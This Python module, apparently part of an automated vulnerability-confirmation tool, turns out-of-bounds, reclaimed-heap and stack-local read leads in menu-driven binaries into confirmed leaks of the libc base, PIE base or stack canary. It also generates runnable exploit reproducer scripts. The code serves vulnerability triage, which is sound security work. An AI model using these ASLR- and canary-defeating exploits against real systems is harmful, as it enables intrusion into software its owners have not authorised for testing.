    input_sha = ctx.put_artifact("oob-read-disclose-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"CWE-125 out-of-bounds read -> {base_kind} disclosure", "target": label,
            "base": hex(base), "base_kind": kind, "array": arr.get("name"), "index": idx,
            "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": "oob_read", "target": label, "index": idx,
                                   "confirmed": True, "note": f"{base_kind} disclosure"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    where = (f"lands on {hit['name']}@got ({hit['gaddr']:#x}), disclosing the resolved libc address "
             f"of {hit['name']}" if kind == "libc"
             else "sweeps up image pointers whose page offsets corroborate the load base")
    forge = (f"the disclosed value minus {hit['name']}'s offset in the linked libc is page aligned"
             if kind == "libc"
             else "at least two distinct leaked pointers' page offsets match image symbols and agree")
    eff = (f"working information disclosure (CWE-125 out-of-bounds read -> {base_kind}): option "
           f"{read_opt} read index {idx} of the {arrn} array -- {abs(idx) * stride:#x} bytes "
           f"{'before' if idx < 0 else 'past'} its base -- which {where}, recovering the {base_kind} "
           f"{base:#x} (ASLR defeated). Forgery-proof: {forge}, which an echo or an in-bounds read "
           f"cannot produce (the negative control did not). This is the leak a "
           f"{'ret2libc / FSOP' if kind == 'libc' else 'PIE ret2win / code-reuse'} chain consumes.")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": f"Information disclosure (demonstrated): L3 OOB read -> {base_kind}",
            "severity": "high", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:oob-read-disclose:{kind}:{target.id}", "site_detail": label,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "disclosure",
                "title": f"Out-of-bounds read -> {base_kind} (ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": "oob_read",
             "disclosure": base_kind, "base": hex(base), "index": idx, "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: OOB read -> {base_kind} {base:#x}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": "oob_read", "disclosure": kind}}


# ------------------------------------- CWE-457 uninitialised / reclaimed heap read -> disclosure
_UNINIT_BIG, _UNINIT_GUARD = 0x4F8, 0x18             # big -> unsorted bin (fd == main_arena); a guard


def _heap_leak_vals(leak: bytes):
    """Pointer-sized values a heap view disclosed (full 8-byte LE words + 0x-hex), for base
    recovery."""
    import re as _re
    from . import leak as _leak
    vals = list(_leak._le_pointer_words(leak))
    vals += [int(m, 16) for m in _re.findall(rb"0x([0-9a-fA-F]{6,16})", leak)]
    return vals


def _heap_uninit_run(ctx, spawn, width, roles, model, uoff, target_bytes, *, skip_free):
    """One in-process heap info-disclosure run: allocate a large chunk (frees to the unsorted bin,
    whose fd is a `main_arena` libc pointer) + a guard, free it, then VIEW that reclaimed memory --
    its stale allocator metadata discloses the libc base (`leaked - unsorted_bin_offset`, accepted
    only when PAGE ALIGNED) or, from a surviving image pointer, the PIE base (`recover_pie_base`).
    `skip_free=True` is the negative control: the SAME view of a still-live chunk discloses no base.
    Returns {kind, base, idx, size, off} or None. Forgery-proof -- an in-bounds/live read cannot
    produce a page-aligned libc base, and PIE needs >=2 corroborating image pointers."""
    from ..fuzz import menu
    from . import exploit
    add, free, view = roles["add"], roles["free"], roles["view"]
    proc = spawn()
    try:
        _pie_drain(proc)

        def send(b):
            proc.stdin.write(b)
            proc.stdin.flush()

        def alloc(idx, size):
            send(menu._scalar(add.encode(), width) + menu._fill(
                model.get(add, []), idx=str(idx).encode(), num=str(size).encode(), width=width))
            _pie_drain(proc)

        def free_i(idx):
            send(menu._scalar(free.encode(), width) + menu._scalar(str(idx).encode(), width))
            _pie_drain(proc)

        def view_i(idx):
            send(menu._scalar(view.encode(), width) + menu._scalar(str(idx).encode(), width))
            return _pie_drain(proc)[0]

        alloc(0, _UNINIT_BIG)
        alloc(1, _UNINIT_GUARD)                          # keep the big chunk off the top
        if not skip_free:
            free_i(0)                                     # -> unsorted bin: fd == main_arena
        vals = _heap_leak_vals(view_i(0))                 # read the reclaimed chunk's metadata
        if uoff:
            for v in vals:
                b = v - uoff
                if b > 0 and b % 0x1000 == 0 and 0x3F0000000000 <= v < 0x800000000000:
                    return {"kind": "libc", "base": b, "idx": 0, "size": _UNINIT_BIG, "off": uoff}
        pie = exploit.recover_pie_base(vals, target_bytes)
        if pie:
            anchor = next(((v - pie) for v in vals
                           if (v - pie) in (set(exploit.elf_functions(target_bytes).values())
                                            | set(exploit.elf_objects(target_bytes).values()))), None)
            if anchor is not None:
                return {"kind": "pie", "base": pie, "idx": 0, "size": _UNINIT_BIG, "off": anchor}
        return None
    except (BrokenPipeError, OSError):
        return None
    finally:
        from ..dynamic import sandbox as _sb
        _sb.kill_quietly(proc)


def _heap_uninit_disclose(ctx, target, lead):
    """Weaponize a CWE-457/125 read lead on a HEAP-menu target into a confirmed libc/PIE DISCLOSURE:
    free a large chunk and read the reclaimed memory, whose stale allocator metadata leaks the base.
    Promotes what heap_trace could only CORROBORATE into a poc-backed L3 with a runnable reproducer.
    Gated by a negative control (the same view of a live chunk discloses no base)."""
    from ..dynamic import heap_discover
    from . import heap as _heap
    from .exploit_stage import _libc_bytes_for
    target_bytes = ctx.content.path(target.sha256).read_bytes()
    libc_data = _libc_bytes_for(ctx, target) or b""
    staged = _stage_and_crawl(ctx, target, exe_dir=None)
    if not staged:
        return None
    wd, exe, opts, model, width = staged
    try:
        roles = heap_discover.identify_heap_ops(wd, exe, model, opts, width)
        if not roles or not roles.get("view"):
            return None
        uoff = 0
        if libc_data:
            try:
                p = Path(wd) / "libc_for_uoff.so"
                p.write_bytes(libc_data)
                uoff = _heap.unsorted_bin_offset(str(p)) or 0
            except Exception:                            # noqa: BLE001
                uoff = 0
        spawn = _pie_spawn(wd, exe)
        hit = _heap_uninit_run(ctx, spawn, width, roles, model, uoff, target_bytes, skip_free=False)
        if not hit:
            return None
        # Negative control: the SAME view WITHOUT the free must disclose no base.
        if _heap_uninit_run(ctx, spawn, width, roles, model, uoff, target_bytes, skip_free=True):
            ctx.emit("chain.hoc", payload={"ok": False, "note": "live-chunk view also disclosed a base"})
            return None
        return _file_heap_uninit_disclose_l3(ctx, target, lead, roles, hit, model.get(roles["add"], []))
    finally:
        shutil.rmtree(wd, ignore_errors=True)


def _heap_uninit_repro_script(roles, hit, add_fields) -> bytes:
    """A stdlib-only reproducer for the reclaimed-heap disclosure: allocate a large chunk + a guard,
    free the big one (its fd becomes a libc `main_arena` pointer), view the reclaimed memory and
    subtract the baked offset -- a page-aligned result is the recovered base. `add_fields` is the
    allocator option's field template, so the reproducer drives it exactly as the crawl did
    (feeding the size, and the buffer bytes for a read()-backed allocator)."""
    add, free, view = roles["add"], roles["free"], roles["view"]
    label = "libc base" if hit["kind"] == "libc" else "PIE image base"
    return (
        "#!/usr/bin/env python3\n"
        "# Reclaimed-heap info-disclosure reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, sys, time\n"
        f"ADD={add!r}; FREE={free!r}; VIEW={view!r}; BIG={_UNINIT_BIG}; GUARD={_UNINIT_GUARD}; "
        f"OFF={hit['off']:#x}; LABEL={label!r}; ADD_FIELDS={list(add_fields)!r}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.4):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        "def alloc(i,sz):\n"
        "  send(ADD+'\\n')\n"
        "  for f in ADD_FIELDS:\n"                        # drive the allocator's own field order
        "    if f=='idx': send(str(i)+'\\n')\n"
        "    elif f=='num': send(str(sz)+'\\n')\n"
        "    elif f=='str': send(b'A'*sz+b'\\n')\n"       # the buffer bytes (a read()-backed alloc)
        "  drain()\n"
        "drain()\n"
        "alloc(0,BIG); alloc(1,GUARD)\n"
        "send(FREE+'\\n'); send('0\\n'); drain()\n"
        "send(VIEW+'\\n'); out=send('0\\n') or drain()\n"
        "vals=[int.from_bytes(out[i:i+8],'little') for i in range(0,max(1,len(out)-7))]\n"
        "vals+=[int(m,16) for m in re.findall(rb'0x([0-9a-fA-F]{6,16})',out)]\n"
        "base=next((v-OFF for v in vals if (v-OFF)>0 and (v-OFF)%0x1000==0 and v>(1<<46)), None)\n"
        "print('[+] reclaimed-heap read -> %s %#x'%(LABEL,base) if base else '[-] no base disclosed')\n"
        "sys.exit(0 if base else 1)\n"
    ).encode()


def _file_heap_uninit_disclose_l3(ctx, target, lead, roles, hit, add_fields):
    """File a confirmed reclaimed-heap information disclosure as an L3 verified PoC -- promoting what
    the heap tracer could only mark 'corroborated' into a poc-backed bundle with a runnable leak."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    kind, base = hit["kind"], hit["base"]
    base_kind = "libc base" if kind == "libc" else "PIE image base"
    script = _heap_uninit_repro_script(roles, hit, add_fields)
    input_sha = ctx.put_artifact("heap-uninit-disclose-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{lead.cwe} reclaimed-heap read -> {base_kind} disclosure",
            "base": hex(base), "base_kind": kind, "view_option": roles["view"],
            "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": "uninit_read", "target": base_kind, "confirmed": True,
                                   "note": f"{base_kind} disclosure"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    forge = ("the disclosed value minus the measured unsorted-bin offset is page aligned"
             if kind == "libc"
             else "at least two leaked pointers' page offsets match image symbols and agree")
    eff = (f"working information disclosure ({lead.cwe} -> {base_kind}): option {roles['add']} "
           f"allocated a large chunk (which frees to the unsorted bin, whose fd is a libc "
           f"main_arena pointer), option {roles['free']} freed it, and option {roles['view']} read "
           f"the RECLAIMED memory -- disclosing its stale allocator metadata and so the {base_kind} "
           f"{base:#x} (ASLR defeated). Forgery-proof: {forge}, which a live-chunk read cannot "
           f"produce (the negative control did not). This is the leak a "
           f"{'ret2libc / FSOP / tcache-poison' if kind == 'libc' else 'PIE code-reuse'} chain "
           f"consumes.")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": f"Information disclosure (demonstrated): L3 reclaimed-heap read -> {base_kind}",
            "severity": "high", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:heap-uninit-disclose:{kind}:{target.id}", "site_detail": base_kind,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "disclosure",
                "title": f"Reclaimed-heap read -> {base_kind} (ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": "uninit_read",
             "disclosure": base_kind, "base": hex(base), "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: reclaimed-heap read -> {base_kind} {base:#x}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": "uninit_read", "disclosure": kind}}


# --------------------------------------------- stack-local read -> canary / saved-return disclosure
def _is_canary(x: int) -> bool:
    """A glibc stack canary is [7 random bytes][0x00]: low byte NUL, the upper bytes populated
    (so not a small 00-terminated integer), and NOT a canonical userspace pointer (so not a
    00-terminated stack/heap/libc address). The run-to-run change in `_stack_secret_disclose` is
    what makes it forgery-proof -- this only gives the shape."""
    return (x & 0xFF) == 0 and (x >> 48) != 0 and not (0x550000000000 <= x < 0x800000000000)


def _sweep_read(spawn, width, read_opt, model, lo, hi):
    """Drive a read option across indices [lo, hi) in one process, returning {idx: disclosed int}.
    Used to walk up a stack frame past a local buffer (saved RBP, the canary, the saved return)."""
    from ..fuzz import menu
    proc = spawn()
    out = {}
    try:
        _pie_drain(proc)
        for idx in range(lo, hi):
            try:
                proc.stdin.write(menu._scalar(read_opt.encode(), width)
                                 + menu._scalar(str(idx).encode(), width))
                proc.stdin.flush()
            except (BrokenPipeError, OSError):
                break
            vals = _int_from_output(_pie_drain(proc)[0])
            if vals:
                out[idx] = vals[0]
            if proc.poll() is not None:
                break
        return out
    finally:
        from ..dynamic import sandbox as _sb
        _sb.kill_quietly(proc)


def _stack_secret_disclose(ctx, spawn, width, opts, model, target_bytes):
    """Steer a stack-local out-of-bounds READ up its own frame and DISCLOSE a stack secret:
      * the stack CANARY -- confirmed by reading the SAME index in TWO fresh processes and requiring
        a canary-shaped value that CHANGES (a per-process random; an echo cannot change, and an
        ASLR pointer is canonical-range so it is excluded) -- the leak that bypasses the canary
        mitigation for a stack overflow;
      * the PIE image base -- from a disclosed saved RETURN address, via recover_pie_base.
    Both forgery-proof + 0-false-confirmation. Returns a dict {read_opt, kind, idx, ...} or None.
    Needs no known array base -- indices are relative to the frame's own buffer."""
    from . import exploit
    read_opts = [o for o in opts if o in model and model[o][:1] == ["idx"]]
    if not read_opts:
        return None
    for read_opt in read_opts:
        if ctx.should_cancel():
            return None
        a = _sweep_read(spawn, width, read_opt, model, 0, 48)
        if not a:
            continue
        # PIE from a saved return (two corroborating image pointers, else a lone unambiguous one).
        vals = list(a.values())
        pie = exploit.recover_pie_base(vals, target_bytes) \
            or exploit.recover_pie_base(vals, target_bytes, allow_single=True)
        if pie:
            anchor = next(((i, v - pie) for i, v in a.items()
                           if (v - pie) in (set(exploit.elf_functions(target_bytes).values())
                                            | set(exploit._call_return_sites(target_bytes)))), None)
            if anchor:
                ctx.progress(msg=f"stack read: option {read_opt} index {anchor[0]} disclosed a "
                                 f"saved return -> PIE base {pie:#x}")
                return {"read_opt": read_opt, "kind": "pie", "idx": anchor[0], "base": pie,
                        "off": anchor[1]}
        # Canary: the same index canary-shaped in two runs, and DIFFERENT (per-process random).
        b = _sweep_read(spawn, width, read_opt, model, 0, 48)
        for idx, v in a.items():
            if _is_canary(v) and idx in b and _is_canary(b[idx]) and b[idx] != v:
                ctx.progress(msg=f"stack read: option {read_opt} index {idx} disclosed the stack "
                                 f"canary ({v:#x}; changed to {b[idx]:#x} next run)")
                return {"read_opt": read_opt, "kind": "canary", "idx": idx, "canary": v}
    return None


def _stack_secret_disclose_stage(ctx, target, lead):
    """Weaponize a CWE-125/457 read lead on a STACK-local buffer into a confirmed canary / PIE
    disclosure (no global array needed -- the read walks its own frame)."""
    target_bytes = ctx.content.path(target.sha256).read_bytes()
    staged = _stage_and_crawl(ctx, target, exe_dir=None)
    if not staged:
        return None
    wd, exe, opts, model, width = staged
    try:
        spawn = _pie_spawn(wd, exe)
        hit = _stack_secret_disclose(ctx, spawn, width, opts, model, target_bytes)
        if not hit:
            return None
        return _file_stack_secret_disclose_l3(ctx, target, lead, hit)
    finally:
        shutil.rmtree(wd, ignore_errors=True)


def _stack_secret_repro_script(hit) -> bytes:
    """A stdlib-only reproducer for a stack-local disclosure. For the PIE base, read the baked index
    and subtract the image offset (page-aligned result). For the canary, read the baked index and
    report the canary-shaped value (low byte NUL, upper bytes populated, non-pointer)."""
    kind = hit["kind"]
    off = hit.get("off", 0)
    return (
        "#!/usr/bin/env python3\n"
        "# Stack-local info-disclosure reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, sys, time\n"
        f"READ={hit['read_opt']!r}; IDX={hit['idx']}; KIND={kind!r}; OFF={off:#x}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.4):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        "drain()\n"
        "send(READ+'\\n'); send(str(IDX)+'\\n'); out=drain()\n"
        "vals=[int(m,16) for m in re.findall(rb'0x([0-9a-fA-F]{6,16})',out)]\n"
        "vals+=[int(m)&0xffffffffffffffff for m in re.findall(rb'-?\\d{3,25}',out)]\n"
        "if KIND=='pie':\n"
        "  base=next((v-OFF for v in vals if (v-OFF)>0 and (v-OFF)%0x1000==0), None)\n"
        "  print('[+] saved return -> PIE base %#x'%base if base else '[-] no base'); sys.exit(0 if base else 1)\n"
        "else:\n"
        "  can=next((v for v in vals if (v&0xff)==0 and (v>>48)!=0 and not (0x550000000000<=v<0x800000000000)), None)\n"
        "  print('[+] stack canary leaked: %#x'%can if can else '[-] no canary'); sys.exit(0 if can else 1)\n"
    ).encode()


def _file_stack_secret_disclose_l3(ctx, target, lead, hit):
    """File a confirmed stack-local disclosure (canary or PIE base) as an L3 verified PoC."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    kind = hit["kind"]
    if kind == "pie":
        secret, base_hex, note = "PIE image base", hex(hit["base"]), "the leak a PIE code-reuse chain consumes"
        forge = "two corroborating image pointers (or one unambiguous saved-return page offset)"
    else:
        secret, base_hex = "stack canary", hex(hit["canary"])
        note = "the secret that bypasses the stack-canary mitigation for a stack overflow"
        forge = ("a canary-shaped value (NUL low byte, non-pointer) that CHANGED between two runs of "
                 "the same input -- a per-process random an echo cannot reproduce")
    script = _stack_secret_repro_script(hit)
    input_sha = ctx.put_artifact("stack-secret-disclose-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{lead.cwe} stack-local read -> {secret} disclosure", "secret": secret,
            "value": base_hex, "read_option": hit["read_opt"], "index": hit["idx"],
            "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": "stack_read", "target": secret, "index": hit["idx"],
                                   "confirmed": True, "note": f"{secret} disclosure"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    eff = (f"working information disclosure ({lead.cwe} stack-local out-of-bounds read -> {secret}): "
           f"option {hit['read_opt']} read index {hit['idx']} of a stack buffer, walking up the "
           f"frame to disclose the {secret} ({base_hex}). Forgery-proof: {forge}. {note}.")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": f"Information disclosure (demonstrated): L3 stack read -> {secret}",
            "severity": "high", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:stack-secret-disclose:{kind}:{target.id}", "site_detail": secret,
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "disclosure", "title": f"Stack-local read -> {secret}",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": "stack_read",
             "disclosure": secret, "value": base_hex, "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: stack read -> {secret} {base_hex}")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": "stack_read", "disclosure": kind}}


# ------------------------------------------------------- CWE-125 out-of-bounds read -> disclosure
_HOT_GOT = ("puts", "printf", "fwrite", "fflush", "putchar", "fputs", "__printf_chk", "fgets",
            "read", "write", "malloc", "free", "setvbuf", "strlen", "memcpy", "strtol",
            "__isoc99_scanf", "__isoc23_strtol")


def _int_from_output(out: bytes):
    """Every integer an OOB-read option might have disclosed: signed/unsigned decimals and hex
    words. A disclosed libc pointer prints as a large decimal or 0x hex; the caller resolves it."""
    import re as _re
    vals = []
    for m in _re.findall(rb"0x([0-9a-fA-F]{6,16})", out):
        vals.append(int(m, 16))
    for m in _re.findall(rb"-?\d{3,25}", out):
        vals.append(int(m) & 0xFFFFFFFFFFFFFFFF)
    return vals


def _oob_read_disclose(ctx, spawn, width, opts, model, arrays, got, syms, target_bytes):
    """Steer an out-of-bounds READ and DISCLOSE a base address -- the libc base (via a GOT slot that
    names a libc symbol) or the PIE image base (via image pointers the read sweeps up). Both are
    forgery-proof + 0-false-confirmation:
      * libc -- the disclosed value minus the symbol's offset in the LINKED libc must be PAGE
        ALIGNED (rop.resolve_libc_base); an echo or an in-bounds value cannot be;
      * PIE  -- recover_pie_base matches the disclosed pointers' page offsets against the image's
        OWN symbols and accepts a base only when >= 2 distinct leaked slots corroborate it.
    Gated by a negative control: the SAME option read IN BOUNDS must NOT disclose either base, so
    the leak is the out-of-bounds access, not incidental output. Returns a dict
    {array, read_opt, kind: 'libc'|'pie', base, ...} or None. libc is preferred (needs no second
    pointer); PIE is the ASLR defeat a position-independent target's own chains need."""
    from ..fuzz import menu
    from . import exploit
    read_opts = [o for o in opts if o in model and model[o][:1] == ["idx"]]
    if not (read_opts and arrays):
        return None
    slots = [(n, a) for n, a in sorted(got.items(),
             key=lambda kv: (_HOT_GOT.index(kv[0]) if kv[0] in _HOT_GOT else 99, kv[0]))
             if n in syms]

    def _read(proc, opt, idx):
        proc.stdin.write(menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width))
        proc.stdin.flush()
        return _pie_drain(proc)[0]

    attempts = 0
    for arr in arrays:
        base_addr, stride, cap = arr["addr"], arr.get("stride", 8) or 8, arr.get("cap", 8)
        if stride <= 0:
            continue
        for read_opt in read_opts:
            proc = spawn()
            try:
                _pie_drain(proc)
                neg_vals = _int_from_output(_read(proc, read_opt, 0))       # in-bounds control
                neg_libc = any(rop_resolve(v, syms) for v in neg_vals)
                neg_pie = bool(exploit.recover_pie_base(neg_vals, target_bytes))
                collected = []                             # (idx, value) across OOB reads
                # (1) libc: each libc-named GOT slot at its exact OOB index.
                for name, gaddr in slots:
                    if (gaddr - base_addr) % stride:
                        continue
                    idx = (gaddr - base_addr) // stride
                    if ctx.should_cancel() or attempts >= 300:
                        return None
                    attempts += 1
                    vals = _int_from_output(_read(proc, read_opt, idx))
                    collected += [(idx, v) for v in vals]
                    for v in vals:
                        b = rop_resolve_one(v, syms.get(name))
                        if b and not neg_libc:
                            ctx.progress(msg=(f"OOB read: option {read_opt} index {idx} "
                                              f"({name}@got {gaddr:#x}) disclosed libc base {b:#x}"))
                            return {"array": arr, "read_opt": read_opt, "kind": "libc", "name": name,
                                    "gaddr": gaddr, "idx": idx, "base": b, "off": syms[name]}
                # (2) PIE: sweep a window of OOB indices (both sides of the array) collecting image
                # pointers, and recover the base from their >=2-way agreement.
                for idx in list(range(-8, 0)) + list(range(cap, cap + 24)):
                    if ctx.should_cancel() or attempts >= 300:
                        break
                    attempts += 1
                    collected += [(idx, v) for v in _int_from_output(_read(proc, read_opt, idx))]
                oob = [v for i, v in collected if i < 0 or i >= cap]
                pie = exploit.recover_pie_base(oob, target_bytes)
                if pie and not neg_pie:
                    anchor = _pie_anchor(collected, pie, cap, target_bytes)
                    if anchor:
                        aidx, avaddr = anchor
                        ctx.progress(msg=(f"OOB read: option {read_opt} swept image pointers -> PIE "
                                          f"base {pie:#x} (index {aidx} discloses +{avaddr:#x})"))
                        return {"array": arr, "read_opt": read_opt, "kind": "pie", "base": pie,
                                "idx": aidx, "off": avaddr}
            finally:
                from ..dynamic import sandbox as _sb
                _sb.kill_quietly(proc)
    return None


def _pie_anchor(collected, base, cap, target_bytes):
    """A concrete (oob_index, image_vaddr) a reproducer can bake: an OOB-disclosed value that equals
    base + a known image symbol vaddr, so the repro reads that index and subtracts the vaddr."""
    from . import exploit
    anchors = set(exploit.elf_functions(target_bytes).values()) \
        | set(exploit.elf_objects(target_bytes).values())
    for idx, v in collected:
        if (idx < 0 or idx >= cap) and (v - base) in anchors:
            return idx, v - base
    return None


def rop_resolve_one(value: int, sym_off):
    from . import rop
    return rop.resolve_libc_base(value, sym_off) if sym_off is not None else None


def rop_resolve(value: int, syms: dict):
    from . import rop
    return next((rop.resolve_libc_base(value, off) for off in syms.values()
                 if rop.resolve_libc_base(value, off)), None)


def _oob_read_disclose_stage(ctx, target, lead):
    """Weaponize a CWE-125/457 out-of-bounds READ lead into a confirmed libc-base DISCLOSURE."""
    from ..dynamic import oob_index
    from . import exploit, rop
    from .exploit_stage import _libc_bytes_for
    target_bytes = ctx.content.path(target.sha256).read_bytes()
    libc_data = _libc_bytes_for(ctx, target) or b""
    got = rop.got_entries(target_bytes)
    if not (libc_data and got):
        return None
    syms = rop.libc_symbols(libc_data, tuple(got))
    syms = {n: syms[n] for n in got if n in syms}
    if not syms:
        return None
    staged = _stage_and_crawl(ctx, target, exe_dir=None)
    if not staged:
        return None
    wd, exe, opts, model, width = staged
    try:
        arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
                  or oob_index._array_candidates_symfree(Path(exe)))
        spawn = _pie_spawn(wd, exe)
        hit = _oob_read_disclose(ctx, spawn, width, opts, model, arrays,
                                 {n: got[n] for n in syms}, syms, target_bytes)
        if not hit:
            return None
        return _file_oob_read_disclose_l3(ctx, target, lead, hit)
    finally:
        shutil.rmtree(wd, ignore_errors=True)


def register() -> None:
    register_stage(CHAIN_STAGE, chain_primitive_stage, resource_class="cpu",
                   tool="ptrace", tool_version=TOOL_VERSION)


def enqueue_chain(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, CHAIN_STAGE, target_id=target.id,
                         params=params or {}, force=force)
